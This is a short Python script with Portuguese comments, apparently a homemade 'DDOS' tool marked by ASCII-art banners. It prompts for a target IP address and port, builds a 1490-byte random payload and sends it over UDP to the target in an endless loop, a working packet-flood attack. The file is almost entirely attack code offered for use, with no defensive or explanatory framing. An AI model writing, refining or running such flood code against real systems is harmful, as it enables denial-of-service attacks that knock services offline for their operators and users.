import socket
import random

print(''' ######  ##     ## ##    ## ##    ## ######## ##    ##    ########  ########   #######   ######  
##    ## ##     ## ###   ## ##   ##  ##       ###   ##    ##     ## ##     ## ##     ## ##    ## 
##       ##     ## ####  ## ##  ##   ##       ####  ##    ##     ## ##     ## ##     ## ##       
 ######  ##     ## ## ## ## #####    ######   ## ## ##    ##     ## ##     ## ##     ##  ######  
      ## ##     ## ##  #### ##  ##   ##       ##  ####    ##     ## ##     ## ##     ##       ## 
##    ## ##     ## ##   ### ##   ##  ##       ##   ###    ##     ## ##     ## ##     ## ##    ## 
 ######   #######  ##    ## ##    ## ######## ##    ##    ########  ########   #######   ######  
''')

# Solicita ao usuário o endereço IP e a porta do alvo
IP = input("Digite o IP do alvo: ")
PORT = int(input("Digite a porta do alvo: "))

# Gera bytes aleatórios (+bytes +poder)
BYTES = random.randbytes(1490)

# Exibe mensagem de ataque
print("Atacando o alvo...")
print('''  :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~
''')

# Envia pacotes infinitamente
while True:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.sendto(BYTES, (IP, PORT))
